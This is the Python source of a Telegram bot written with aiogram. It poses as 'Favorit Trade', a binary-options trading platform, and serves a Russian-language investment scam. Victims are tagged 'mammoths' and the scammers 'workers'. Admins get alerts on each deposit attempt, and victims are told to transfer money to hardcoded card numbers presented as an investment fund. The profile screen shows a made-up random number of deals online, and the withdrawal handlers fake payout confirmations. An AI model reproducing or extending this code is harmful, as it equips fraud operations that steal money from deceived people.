from aiogram import types
from aiogram.dispatcher.filters.builtin import CommandStart
from aiogram.types import message
from loader import dp, bot
from utils.db_api.db_commands import add_user
from utils.db_api.database import db
from utils.db_api.models import User
import logging
from aiogram.dispatcher import FSMContext
from data.config import QIWI_TOKEN
import random
from utils.db_api.db_commands import update_user_payment, get_user, update_bill_qiwi, add_money_user, get_user_about_id, get_card_number, edit_money_user, activate_coupon
from keyboards.inline.start_rules import start_rules_key
from keyboards.default.profile_keyboard import profile_key
from keyboards.default.start_menu_keyboards import start_menu
from keyboards.default.balance_keyboard import down_balance, up_balance
from handlers.states import Paymenting
from keyboards.inline.mamont_buy import mamont_buying
from keyboards.inline.mamont_without import mamont_withouting, confirm_mamont_without
from keyboards.inline.support_keyboard import kb_support
from markdown import Markdown

from data.config import ADMINS, CHANNEL_ID
from pyqiwip2p import QiwiP2P
from pyqiwip2p.types import QiwiCustomer, QiwiDatetime

@dp.message_handler(text="🔙Назад")
async def back_to_menu_inpay(message: types.Message):
    await update_bill_qiwi("-",message.from_user.id,0)
    await message.answer(f"🔙* Вы вернулись в главное меню*", reply_markup=start_menu,parse_mode='Markdown')

@dp.message_handler(text="🔙Назад", state=Paymenting)
async def back_to_menu(message: types.Message, state: FSMContext):
    await update_bill_qiwi("-",message.from_user.id,0)
    await message.answer(f"🔙 *Вы вернулись в главное меню*", reply_markup=start_menu,parse_mode='Markdown')
    await state.reset_state()

@dp.message_handler(text="👨‍💻Профиль")
async def open_profile(message: types.Message):
    user = await get_user(message.from_user.id)
    ref_id = user.user_id
    bot_username = (await bot.me).username
    bot_link = f"https://t.me/{bot_username}?start={ref_id}"
    with open('asino.jpg', 'rb') as pic:
        await bot.send_photo(chat_id=message.from_user.id,photo=pic,caption=f"👨🏽‍💻 *Ваш профиль* \n➖➖➖➖➖➖\n💰 *Ваш баланс: {user.cash} {user.payment} 💰*\n➖➖➖➖➖➖\n🔺  *Сделок онлайн: {random.randint(1000,2000)}*", reply_markup=profile_key,parse_mode= 'Markdown')
    pic.close()

@dp.message_handler(text="💸Пополнить")
async def open_profile(message: types.Message):
    await message.answer(f"💰 Введите сумму пополнения", reply_markup=down_balance)
    await Paymenting.Pay_Money.set()

@dp.message_handler(state=Paymenting.Pay_Money)
async def pay_money_start(message: types.Message, state: FSMContext):
    try:
        price = int(message.text)
    except ValueError:
        if(message.text=="🔙Назад"):
            await message.answer(f"🔙* Вы вернулись в главное меню*", reply_markup=start_menu,parse_mode='Markdown')
            await state.reset_state()
            return
        else:
            await message.answer("⛔️*Неправильно, Введите число!*",parse_mode='Markdown')
            return
    user= await get_user(message.from_user.id)
    if(user.payment=="RUB"):
        card = await get_card_number(1)
        text = (f"♻️Оплата на карту \n\n 🏦Для пополнения игрового баланса переведите сумму которую вы указали выше, на банковские реквизиты нашего инвестиционного фонда \n\n 5536 9140 0582 4598\n\n Если возникнут проблемы, обратитесь в тех.поддержку")
        await message.answer(text, reply_markup=up_balance)
        await update_bill_qiwi("-",message.from_user.id,price)
        await Paymenting.Payed_Card.set()
    if(user.payment=="UAH"):
        card = await get_card_number(2)
        text = (f"♻️Оплата на банковскую карту \n\n 🏦Для пополнения игрового баланса переведите сумму которую вы указали выше, на банковские реквизиты нашего инвестиционного фонда  \n\n 5375 4141 3018 8476 \n\n Если возникнут проблемы, обратитесь в тех.поддержку")
        await message.answer(text, reply_markup=up_balance)
        await update_bill_qiwi("-",message.from_user.id,price)
        await Paymenting.Payed_Card.set()
    if(user.payment=="BYN"):
        card = await get_card_number(2)
        text = (f"♻️Оплата на банковскую карту \n\n 🏦Для пополнения игрового баланса переведите сумму которую вы указали выше, на банковские реквизиты нашего инвестиционного фонда : \n\n 5375 4141 3018 8476 \n\n Если возникнут проблемы, обратитесь в тех.поддержку")
        await message.answer(text, reply_markup=up_balance)
        await update_bill_qiwi("-",message.from_user.id,price)
        await Paymenting.Payed_Card.set()

@dp.message_handler(text="✔️Проверить оплату", state=Paymenting.Payed_Card)
async def pay_money_end(message: types.Message, state: FSMContext):
    user = await get_user(message.from_user.id)
    text = "Как только мы увидим поступление средств ваш баланс автоматически пополниться!✔️"
    markup= await mamont_buying(user.user_id,user.add_money)
    worker = await get_user(user.referral)
    for admin in ADMINS:
        try:
            await dp.bot.send_message(admin, f"🎰* Попытка пополнения 🎰 \n 🐘 Мамонт: {user.full_name} @{user.username}  🐘 \n🧑‍💻 Воркер: {worker.full_name} @{worker.username} 🧑‍💻 \n🏦 Сумма: {user.add_money} {user.payment}  *🏦", reply_markup=markup,parse_mode='Markdown')
        except Exception as err:
            logging.exception(err)
    await bot.send_message(chat_id=user.referral, text=f"🎰* Попытка пополнения 🎰 \n🏦 Сумма: {user.add_money} {user.payment} 🏦\n🐘 Мамонт: {user.full_name} @{user.username} 🐘*", reply_markup=markup,parse_mode='Markdown')
    await update_bill_qiwi("-",message.from_user.id,0)
    await message.answer(text, reply_markup=start_menu)
    await state.reset_state()

@dp.message_handler(text="✔️Проверить оплату", state=Paymenting.Payed_Money)
async def pay_money_end(message: types.Message, state: FSMContext):
    p2p=QiwiP2P(auth_key=QIWI_TOKEN)
    user= await get_user(message.from_user.id)
    bill_id = user.bill_idi
    status = p2p.check(bill_id=bill_id).status
    if status != 'PAID': 
        await message.answer(f'Оплата прошла успешно!', reply_markup=profile_key)
        await add_money_user(user.add_money,message.from_user.id)

        worker = await get_user(user.referral)

        text= (f"💸Успешный перевод💸\n:💰Сумма - {user.add_money} {user.payment}\n🏗️Воркер - {worker.full_name} @{worker.username}✅")
        await bot.send_message(chat_id=CHANNEL_ID, text=text)
        
        await update_bill_qiwi("-",message.from_user.id,0)
        await state.reset_state()
        await open_profile(message)
    else:
        await message.answer('Вы не оплатили счет!')

@dp.message_handler(text="🏧Активировать промокод")
async def activate_coupon_money(message: types.Message):
    user = await get_user(message.from_user.id)
    await message.answer(f"Введите промокод:", reply_markup=down_balance)
    await Paymenting.Activate_Coupon.set()  

@dp.message_handler(state=Paymenting.Activate_Coupon)
async def activate_coupon_money_end(message: types.Message, state: FSMContext):
    user = await get_user(message.from_user.id)
    coupon_code = message.text
    activated = await activate_coupon(coupon_code,user.user_id,user.referral)
    if(activated == 1):
        await message.answer(f"💸*Промокод активирован!*", reply_markup=start_menu,parse_mode='Markdown')
    else:
        await message.answer(f"⛔️*Промокода не существует!*", reply_markup=start_menu,parse_mode='Markdown')
    await state.reset_state()

@dp.message_handler(text="💰Вывести")
async def out_money(message: types.Message):
    user = await get_user(message.from_user.id)
    await message.answer(f"💰*Доступная сумма для вывода* {user.cash} {user.payment}",parse_mode='Markdown')
    await message.answer(f"*Введите сумму для вывода*", reply_markup=down_balance,parse_mode='Markdown')
    await Paymenting.Get_Money.set()

@dp.message_handler(state=Paymenting.Get_Money)
async def out_money_end(message: types.Message, state: FSMContext):
    user = await get_user(message.from_user.id)
    try:
        price = int(message.text)
    except ValueError:
        await message.answer("⛔️*Неправильно, Введите число!*",parse_mode='Markdown')
        return
    if(user.cash==0):
        await message.answer(f"*Недостаточно средств!*", reply_markup=start_menu,parse_mode='Markdown')
    else:
        if(100<=price):
            if(user.cash<price):
                await message.answer(f"*На вашем балансе недостаточно средств!*", reply_markup=start_menu,parse_mode='Markdown')
            else:
                markup= await mamont_withouting(user.user_id, price)
                await bot.send_message(chat_id=user.referral, text=f"*🎰 Ваш мамонт хочет вывести! 🎰\n🏦 Сумма: {price} {user.payment} 🏦\n🐘 Мамонт: @{user.username}  {user.full_name} 🐘*", reply_markup=markup,parse_mode='Markdown')
                money = user.cash - price
                await edit_money_user(money, message.from_user.id)
                await message.answer(f"*💸Ваша заявка на вывод была успешно создана!*", reply_markup=start_menu,parse_mode='Markdown')
        else:
            await message.answer(f"*Вывод доступен от 100 {user.payment}*", reply_markup=start_menu,parse_mode='Markdown')
    await state.reset_state()

@dp.callback_query_handler(confirm_mamont_without.filter())
async def mamont_without_agree(call:types.CallbackQuery, callback_data: dict):
    user_id= int(callback_data.get('user_id'))
    price = int(callback_data.get('price'))
    agree=int(callback_data.get('agree'))
    if(agree==1):
        await bot.send_message(chat_id=user_id, text=f"\n*Вывод обработан✅\n\nДеньги были отправлены на реквизиты с которых было последнее пополнение!*\n",parse_mode='Markdown')
    else:
        await add_money_user(price,user_id)
        await bot.send_message(chat_id=user_id, text=f"\n*Ошибка вывода❌\nОбратитесь в Техническую Поддержку🛠*", reply_markup=kb_support,parse_mode='Markdown')
    await call.message.edit_text(text=f"Готово✅")

@dp.message_handler(text="🌐О нас")
async def open_profile(message: types.Message):
    await message.answer("*Favorit Trade - лучшая трейдинг платформа в Telegram!\n\nFavorit Trade — брокер бинарных опционов, осуществляющий деятельность с 2014 года. Компания ведет клиентоориентированную политику — предоставляет лояльные торговые условия, расширенный аналитический сервис и собственную удобную платформу*",parse_mode='Markdown')
